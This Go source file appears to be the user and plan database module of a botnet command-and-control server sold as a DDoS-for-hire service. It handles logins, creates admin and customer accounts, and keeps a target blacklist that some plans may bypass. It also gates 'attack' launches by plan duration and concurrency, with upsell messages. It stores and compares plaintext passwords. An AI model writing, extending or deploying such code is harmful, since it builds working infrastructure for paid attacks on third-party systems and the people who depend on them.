package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"path/filepath"
	"strings"

	"github.com/fatih/color"
	"golang.org/x/crypto/bcrypt"
)

type Database struct {
	base_dir string
}

type AccountInfo struct {
	username        string
	admin           int
	plan            string
	maxTime         int
	concs           int
	cncAccess       bool
	bypassBlacklist bool
	NextCncPlan     string
	NextBypassPlan  string
}

type JSONUser struct {
	Username   string `json:"username"`
	Password   string `json:"password"` // bcrypt hashed usually, but keeping simple matching for parity if raw is used, or bypassing in mock
	Plan       string `json:"plan"`
	Expiration string `json:"expiration"`
	APIKey     string `json:"apiKey"`
	TelegramID string `json:"telegramId"`
	Admin      bool   `json:"admin"`
}

func NewDatabase() *Database {
	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
	if err != nil {
		dir, _ = os.Getwd()
	}
	color.Green("[C2] Database Path Context: %s", dir)
	return &Database{base_dir: dir}
}

func (this *Database) loadUsers() []JSONUser {
	path := filepath.Join(this.base_dir, "..", "database", "users.json")
	var users []JSONUser
	data, err := ioutil.ReadFile(path)
	if err != nil {
		color.Red("[CRITICAL] Failed to read users.json at %s: %v", path, err)
		return []JSONUser{}
	}
	if err := json.Unmarshal(data, &users); err != nil {
		color.Red("[CRITICAL] Failed to parse users.json: %v", err)
		return []JSONUser{}
	}
	return users
}

func (this *Database) saveUsers(users []JSONUser) {
	path := filepath.Join(this.base_dir, "..", "database", "users.json")
	data, _ := json.MarshalIndent(users, "", "    ")
	ioutil.WriteFile(path, data, 0644)
}

func (this *Database) TryLogin(username string, password string, ip net.Addr) (bool, AccountInfo) {
	users := this.loadUsers()
	path := filepath.Join(this.base_dir, "..", "database", "plans.json")
	var plans map[string]interface{}
	pData, err := ioutil.ReadFile(path)
	if err != nil {
		color.Red("[CRITICAL] Failed to read plans.json: %v", err)
	} else {
		json.Unmarshal(pData, &plans)
	}

	for _, u := range users {
		// Support case-insensitive matching
		if strings.EqualFold(u.Username, username) {
			// Password comparison (support both plain text and bcrypt)
			isMatch := false
			if u.Password == password {
				isMatch = true
			} else {
				err := bcrypt.CompareHashAndPassword([]byte(u.Password), []byte(password))
				if err == nil {
					isMatch = true
				}
			}

			if !isMatch {
				color.Red("[AUTH] Failed login for %s (Incorrect password)", username)
				return false, AccountInfo{}
			}

			adminLevel := 0
			if u.Admin || strings.ToLower(u.Plan) == "admin" {
				adminLevel = 1
			}

			maxT := 60
			conc := 1
			cncAccess := true
			bypassBlacklist := false

			if p, ok := plans[u.Plan].(map[string]interface{}); ok {
				if mt, exists := p["maxTime"].(float64); exists {
					maxT = int(mt)
				}
				if c, exists := p["concurrents"].(float64); exists {
					conc = int(c)
				}
				if ca, exists := p["cnc_access"].(bool); exists {
					cncAccess = ca
				}
				if bb, exists := p["bypassBlacklist"].(bool); exists {
					bypassBlacklist = bb
				}
			}

			// Find recommended plans for denials (Dynamic Discovery)
			nextCnc := "a higher tier"
			nextBypass := "a power tier"
			for pName, pData := range plans {
				if pd, ok := pData.(map[string]interface{}); ok {
					// Skip Admin in recommendations if possible
					if strings.ToLower(pName) == "admin" {
						continue
					}
					if val, ok := pd["cnc_access"].(bool); ok && val && nextCnc == "a higher tier" {
						nextCnc = pName
					}
					if val, ok := pd["bypassBlacklist"].(bool); ok && val && nextBypass == "a power tier" {
						nextBypass = pName
					}
				}
			}

			color.Cyan("[AUTH] Successful login for %s from %s", u.Username, ip.String())
			return true, AccountInfo{u.Username, adminLevel, u.Plan, maxT, conc, cncAccess, bypassBlacklist, nextCnc, nextBypass}
		}
	}
	color.Red("[AUTH] Failed login for %s (User not found)", username)
	return false, AccountInfo{}
}

func (this *Database) CreateBasic(username string, password string, duration int, cooldown int) bool {
	users := this.loadUsers()
	for _, u := range users {
		if u.Username == username {
			return false
		}
	}
	users = append(users, JSONUser{
		Username:   username,
		Password:   password,
		Plan:       "Free",
		Expiration: "Lifetime",
		Admin:      false,
	})
	this.saveUsers(users)
	color.Yellow("Added new basic %s to database.", username)
	return true
}

func (this *Database) CreateAdmin(username string, password string, duration int, cooldown int) bool {
	users := this.loadUsers()
	for _, u := range users {
		if u.Username == username {
			return false
		}
	}
	users = append(users, JSONUser{
		Username:   username,
		Password:   password,
		Plan:       "Admin",
		Expiration: "Lifetime",
		Admin:      true,
	})
	this.saveUsers(users)
	color.Yellow("Added new admin %s to database.", username)
	return true
}

func (this *Database) BlockRange(host string) bool {
	path := filepath.Join(this.base_dir, "..", "database", "blacklist.txt")
	f, _ := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		defer f.Close()
		f.WriteString(host + "\n")
		color.Yellow("Added new whitelist range to database.")
		return true
	}
	return false
}

func (this *Database) UnBlockRange(prefix string) bool {
	path := filepath.Join(this.base_dir, "..", "database", "blacklist.txt")
	content, err := ioutil.ReadFile(path)
	if err != nil {
		return false
	}
	lines := strings.Split(string(content), "\n")
	var newLines []string
	for _, l := range lines {
		if strings.TrimSpace(l) != prefix && strings.TrimSpace(l) != "" {
			newLines = append(newLines, l)
		}
	}
	ioutil.WriteFile(path, []byte(strings.Join(newLines, "\n")+"\n"), 0644)
	color.Yellow("Removed IP %s from blacklist", prefix)
	return true
}

func (this *Database) RemoveUser(username string) bool {
	users := this.loadUsers()
	for i, u := range users {
		if u.Username == username {
			users = append(users[:i], users[i+1:]...)
			this.saveUsers(users)
			color.Yellow("Removed user %s from database", username)
			return true
		}
	}
	return false
}

func (this *Database) ContainsWhitelistedTargets(attack string) bool {
	path := filepath.Join(this.base_dir, "..", "database", "blacklist.txt")
	content, err := ioutil.ReadFile(path)
	if err != nil {
		return false
	}
	lines := strings.Split(string(content), "\n")
	for _, host := range lines {
		if host = strings.TrimSpace(host); host != "" {
			if strings.Contains(attack, host) {
				return true
			}
		}
	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration int, fullCommand string) (bool, error) {
	users := this.loadUsers()
	path := filepath.Join(this.base_dir, "..", "database", "plans.json")
	var plans map[string]interface{}
	pData, _ := ioutil.ReadFile(path)
	json.Unmarshal(pData, &plans)

	for _, u := range users {
		if u.Username == username {
			userPlan := plans[u.Plan]
			if u.Plan == "" {
				userPlan = plans["Free"]
			}

			if p, ok := userPlan.(map[string]interface{}); ok {
				maxT := 0
				if mt, exists := p["maxTime"].(float64); exists {
					maxT = int(mt)
				}
				slots := 0
				if s, exists := p["slots"].(float64); exists {
					slots = int(s)
				}

				if slots <= 0 {
					return false, fmt.Errorf("[ACCESS DENIED] YOUR PLAN (%s) DOES NOT ALLOW ATTACKS. UPGRADE TO VIP TO UNLOCK INFRASTRUCTURE!", strings.ToUpper(u.Plan))
				}

				if !u.Admin && duration > maxT {
					return false, fmt.Errorf("[ACCESS DENIED] PLAN LIMIT: MAX %dS. UPGRADE TO EXPAND YOUR ARSENAL!", maxT)
				}
			}
			return true, nil
		}
	}
	return false, fmt.Errorf("[CRITICAL FAILURE] OPERATOR PRIVILEGES REVOKED OR SESSION EXPIRED")
}

func (this *Database) GetAPIKey(username string) string {
	users := this.loadUsers()
	for _, u := range users {
		if u.Username == username {
			return u.APIKey
		}
	}
	return ""
}
